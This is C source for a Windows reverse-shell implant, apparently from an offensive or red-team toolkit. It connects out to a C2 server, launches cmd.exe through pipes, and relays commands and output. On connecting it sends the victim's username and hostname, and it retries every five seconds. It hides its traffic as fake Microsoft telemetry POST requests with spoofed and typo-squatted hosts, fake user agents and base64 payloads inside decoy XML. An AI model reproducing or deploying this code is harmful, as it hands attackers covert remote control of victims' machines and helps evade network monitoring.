#include<stdio.h>
#include<winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

#include "MgArguments.h"
#include "Tools.h"
#include "Message.h"

#include "Base64.h"
#include "RunShell.h"
#include "SocketTools.h"

// https://github.com/limbenjamin/ReverseShellDll/blob/master/ReverseShellDLL/dllmain.cpp




#define BUFFER_SIZE_ENC			10000
#define UNLEN					256
#define BUF_SIZE				1000
#define GET_RAND_VALUE(tab)		rand() % (sizeof(tab) / sizeof(char*) -1)

typedef HANDLE PIPE;
typedef HANDLE* LPIPE;

// Exemple: 
// https://gist.github.com/mchow01/7014a28b116a425614db62bf90f9ab9e
int ObfuscateDate(char* sendBuffer, char** ppSendObfBuffer) {
	const char* requestPageTab[] = {
		"/dsp/mp/microsoft/2.2/telemetry.aspx",
		"/dsp/mp/microsoft/telemetry.aspx?id=feruozfeofdi&SID=dadhziadhzaduhuz",
		"/watson/settings/microsft/?id=fhzeujozifj",
		"/post/xml/microsft/?id=fzfregregr",
		"/windows/browser/edge/service/navigate/4"
	};
	const char* userAgentTab[] = {
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
		"SmartScreen/2814750931223057",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763"
	};
	const char* hostTab[] = {
		"settings-win.data.microsoft.com",
		"db5.settings-win.data.microsoft.com.akadns.net",
		"asimov-win.settings.data.microsoft.com.akadns.net",
		"db5.vortex.data.microsoft.com.akadns.net",
		"v10-win.vortex.data.microsft.com.akadns.net",
		"geo.vortex.data.microsoft.com.akadns.net",
		"v10.vortex-win.data.microsft.com",
		"us.vortex-win.data.microsft.com",
		"eaus2watcab01.blob.core.windows.net",
		"eu.vortex-win.data.microsft.com",
		"alpha.telemetry.microsft.com",
		"vortex-win-sandbox.data.microsoft.com",
		"watson.telemetry.microsoft.com"
	};
	char* requestTemplate = {
		"POST %s HTTP/1.1\r\n"  // 1.1  and 1.0
		"User-Agent: %s\r\n"
		"Host: %s\r\n"
		"Accept: text/html,application/xhtml+xml,application/xml\r\n" // rand 
		"X-Tableau-Auth: 12ab34cd56ef78ab90cd12ef34ab56cd\r\n" // rand 
		"Accept-Encoding: gzip, deflate\r\n"
		"Accept-Language: en-US\r\n"
		"Content-Type: application/xml\r\n"
		"SID=%s;"
		"Content-Length: %i\r\n\r\n"
		"%s" // BODY
	};

	char* sendObfBuffer = (char*)malloc(BUFFER_SIZE_ENC);
	if (sendObfBuffer != NULL) {
		char* body = (char*)malloc(BUFFER_SIZE_ENC - 1000);
		if (body != NULL) {
			char* randString = "fjziefhzoeifuhiuzfejio";
			int bodySize;
			char* junkBodyDateTab[] = {
				"<TelemetryProcessors>\r\n"
				"<Add Type=\"Microsoft.ApplicationInsights.WindowsServer.TelemetryChannel.AdaptiveSamplingTelemetryProcessor, Microsoft.AI.ServerTelemetryChannel\">\r\n"
				"<MaxTelemetryItemsPerSecond>5</MaxTelemetryItemsPerSecond>\r\n"
				"</Add>\r\n"
				"</TelemetryProcessors>\r\n",

				"<Add type=\"com.microsoft.applicationinsights.web.extensibility.modules.WebRequestTrackingTelemetryModule\" > \r\n",
				"   <Param name = \"W3CEnabled\" value = \"true\"/>\r\n",
				"   <Param name =\"enableW3CBackCompat\" value = \"true\" />\r\n",
				"</Add>"
			};
			const char* payloadVrapperStart = {
				"<ApplicationInsights>\r\n"
				"     <ApplicationIdProvider Type =\"Microsoft.ApplicationInsights.Extensibility.Implementation.ApplicationId.DictionaryApplicationIdProvider, Microsoft.ApplicationInsights\">" };
			const char* payloadVrapperStop = {
				"</ApplicationIdProvider>\r\n"
				"</ApplicationInsights>\r\n"
			};
			const char* xmlHeaderTab[] = {
				"<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\" ?>\r\n",
				"<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\r\n",
				"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\r\n",
				"<?xml version=\"1.0\"?>\r\n"
				"<!DOCTYPE telemetry SYSTEM \"telemetry.dtd\">\r\n"
			};
			int dataSize = 0;
			char* tempBufferb64 = (char*)malloc(BUFFER_SIZE_ENC - 1000);

			if (tempBufferb64 != NULL) {
				char* xmlHeader = (char*)xmlHeaderTab[GET_RAND_VALUE(xmlHeaderTab)];
				char* junkBodyDate1 = (char*)junkBodyDateTab[GET_RAND_VALUE(junkBodyDateTab)];
				char* junkBodyDate2 = (char*)junkBodyDateTab[GET_RAND_VALUE(junkBodyDateTab)];
				char* requestPage = (char*)requestPageTab[GET_RAND_VALUE(requestPageTab)];
				char* userAgent = (char*)userAgentTab[GET_RAND_VALUE(userAgentTab)];
				char* host = (char*)hostTab[GET_RAND_VALUE(hostTab)];

				// sendBuffer = encryption(sendBuffer,key);
				Base64Encode(sendBuffer, tempBufferb64);

				// BUffer over flow !!!! 
				bodySize = sprintf_s(body, BUFFER_SIZE_ENC - 1000, "%s%s%s%s%s%s", xmlHeader, junkBodyDate1, payloadVrapperStart, tempBufferb64, payloadVrapperStop, junkBodyDate2);
				free(tempBufferb64);
				dataSize = sprintf_s(sendObfBuffer, BUFFER_SIZE_ENC, requestTemplate, requestPage, userAgent, host, randString, bodySize, body);
				*ppSendObfBuffer = sendObfBuffer;

			}

			free(body);
			return dataSize;
		}
		free(sendObfBuffer);
	}
	return 0;
}
int DeobfuscateDate(char* recvBuffer) {
	const char startPattern[] = "base64,iVBORw0KGgoAAAANSUhEU";
	char* ptrStart = strstr(recvBuffer, startPattern);

	if (ptrStart != NULL) {
		ptrStart += sizeof(startPattern) - 1;
		char* ptrEnd = strstr(ptrStart, "/>");
		if (ptrEnd != NULL) {
			int dataSize = (int)(ptrEnd - ptrStart);
			char* tempBuffer = (char*)calloc(BUFFER_SIZE_ENC, 1);
			if (tempBuffer != NULL) {
				int outputSize;
				strncpy_s(tempBuffer, BUFFER_SIZE_ENC, ptrStart, dataSize);
				memset(recvBuffer, 0, BUFFER_SIZE_ENC);
				Base64Dencode(tempBuffer, recvBuffer);
				// recvBuffer = decryption(recvBuffer,key);
				outputSize = (int)strlen(recvBuffer);
				free(tempBuffer);
				return outputSize;
			}
		}
	}
	return 0;
}

BOOL SendEnc(SOCKET clientSocket, char* msg) {
	char* sendObfBuffer = NULL;
	DWORD bytesReadFromPipe = ObfuscateDate(msg, &sendObfBuffer);
	if (sendObfBuffer != NULL) {
		printf("===============================\n");
		printMsg(STATUS_DEBUG, LEVEL_DEFAULT,"%s\n", sendObfBuffer);
		send(clientSocket, sendObfBuffer, bytesReadFromPipe, 0);
		free(sendObfBuffer);
	}
	return bytesReadFromPipe;
}
BOOL SendEncInitInfo(SOCKET mysocket) {
	char* userName;
	char* hostname;
	int sizeBufUsername = UNLEN + 1;

	userName = (char*)calloc(UNLEN + 1, sizeof(char));
	if (userName == NULL) {
		return FALSE;
	}
	if (!GetUserNameA(userName, &sizeBufUsername)) {
		free(userName);
		return FALSE;
	}
	hostname = (char*)calloc(UNLEN + 1, sizeof(char));
	if (hostname == NULL) {
		free(userName);
		return FALSE;
	}

	if (gethostname(hostname, UNLEN + 1) != SOCKET_ERROR) {
		struct sockaddr_in name;
		int len = sizeof(name);
		if (getpeername(mysocket, (struct sockaddr*)&name, &len) != SOCKET_ERROR) {
			char* sendBuffer = (char*)calloc(BUF_SIZE, sizeof(char));
			if (sendBuffer == NULL) {
				free(hostname);
				free(userName);
				return FALSE;
			}
			sprintf_s(sendBuffer, BUF_SIZE, "[+] Connected as %s from %s\n\n", userName, hostname);

			SendEnc(mysocket, sendBuffer);
		}
	}
	free(hostname);
	free(userName);
	return TRUE;
}



// PIPE InWrite, InRead, OutWrite, OutRead;
// char Process[] = "cmd.exe";
HANDLE CreateProcessShell(char* Process, LPIPE InWrite, LPIPE InRead, LPIPE OutWrite, LPIPE OutRead) {
	SECURITY_ATTRIBUTES secAttrs;
	STARTUPINFOA sInfo;
	PROCESS_INFORMATION pinfo;

	memset(&sInfo, 0, sizeof(STARTUPINFOA));
	sInfo.cb = sizeof(STARTUPINFOA);
	sInfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);

	secAttrs.nLength = sizeof(SECURITY_ATTRIBUTES);
	secAttrs.bInheritHandle = TRUE;
	secAttrs.lpSecurityDescriptor = NULL;

	if (!CreatePipe(InWrite, InRead, &secAttrs, 0)) {
		printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to create pipe read");
		return NULL;
	}
	if (!CreatePipe(OutWrite, OutRead, &secAttrs, 0)) {
		printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to create pipe write");
		return NULL;
	}

	sInfo.hStdInput = *OutWrite;
	sInfo.hStdOutput = *InRead;
	sInfo.hStdError = *InRead;

	if (!CreateProcessA(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sInfo, &pinfo))
		return NULL;

	CloseHandle(pinfo.hThread);
	return pinfo.hProcess;
}
BOOL CmdInput(SOCKET mySocket, PIPE OutRead) {
	char* recvBuffer = (char*)malloc(BUFFER_SIZE_ENC);
	DWORD bytesReadFromPipe = 0;

	if (recvBuffer == NULL)
		return FALSE;

	memset(recvBuffer, 0, BUFFER_SIZE_ENC);
	int result = recv(mySocket, (char*)recvBuffer, BUFFER_SIZE_ENC, 0);
	//printf("recv: %s\n", recvBuffer);
	// Got new input from remote end
	if (result > 0) {
		if (result < BUFFER_SIZE_ENC)
			recvBuffer[result] = '\0';
		result = DeobfuscateDate(recvBuffer);
		//printf("Deobf recv: '%s'\n", recvBuffer);

		if (strcmp(recvBuffer, "exit") == 0) {
			const char exitMsg[] = "Exiting Shell. Goodbye.\r\n";
			SendEnc(mySocket, (char*)exitMsg);
			printMsg(STATUS_WARNING, LEVEL_DEFAULT, "Recv exit msg !");
			free(recvBuffer);
			return FALSE;
		} else if (!WriteFile(OutRead, recvBuffer, result, &bytesReadFromPipe, NULL)) {
			printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to write to pipe");
			free(recvBuffer);
			return FALSE;
		}
	} else {
		printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Connection to the C2 lost");
		free(recvBuffer);
		return FALSE;
	}
	free(recvBuffer);
	return TRUE;
}
BOOL CmdOutput(SOCKET mySocket, PIPE InWrite) {
	char* sendBuffer = (char*)malloc(BUFFER_SIZE_ENC);
	DWORD bytesReadFromPipe = 0;

	if (sendBuffer == NULL)
		return FALSE;

	memset(sendBuffer, 0, BUFFER_SIZE_ENC);

	PeekNamedPipe(InWrite, NULL, 0, NULL, &bytesReadFromPipe, NULL);
	while (bytesReadFromPipe && ReadFile(InWrite, sendBuffer, BUFFER_SIZE_ENC, &bytesReadFromPipe, NULL)) {
		char* sendObfBuffer = NULL;

		BOOL enable = TRUE;
		if (enable) {
			SendEnc(mySocket, sendBuffer);
		} else {
			ObfuscateDate(sendBuffer, &sendObfBuffer);
			printMsg(STATUS_DEBUG, LEVEL_DEFAULT, "Sending: %s\n", sendObfBuffer);
			send(mySocket, (char*)sendBuffer, (int)bytesReadFromPipe, 0);
		}
		bytesReadFromPipe = 0;
		Sleep(50);
		PeekNamedPipe(InWrite, NULL, 0, NULL, &bytesReadFromPipe, NULL);
	}
	free(sendBuffer);
	return TRUE;
}


BOOL CustomShell(WCHAR* C2Server, int C2Port) {
	char ipAddress[IP_ADDRESS_SIZE];
	sprintf_s(ipAddress, IP_ADDRESS_SIZE, "%ws", C2Server);

	while (TRUE) {
		SOCKET mySocket = ConnectRemoteServer(ipAddress, C2Port);
		if (mySocket != (SOCKET)NULL) {
			char recvBuffer[BUFFER_SIZE_ENC];
			memset(recvBuffer, 0, BUFFER_SIZE_ENC);
			printMsg(STATUS_OK, LEVEL_DEFAULT, "Connected to %s:%i\n", ipAddress, C2Port);
			if (SendEncInitInfo(mySocket)) {
				PIPE InWrite, InRead, OutWrite, OutRead;
				DWORD exitCode = STILL_ACTIVE;
				HANDLE hProcess = CreateProcessShell("cmd.exe", &InWrite, &InRead, &OutWrite, &OutRead);
				if (hProcess == NULL) {
					printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to create process");
					return FALSE;
				}
				while (mySocket != SOCKET_ERROR && exitCode == STILL_ACTIVE) {
					CmdOutput(mySocket, InWrite);
					Sleep(200);
					if (!CmdInput(mySocket, OutRead))
						mySocket = SOCKET_ERROR;
					Sleep(200);
					GetExitCodeProcess(hProcess, &exitCode);
				}
				if (exitCode != STILL_ACTIVE)
					printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Exit: cmd != STILL_ACTIVE");
			}

			closesocket(mySocket);
		}
		Sleep(5000);    // Five Second
	}
	return TRUE;
}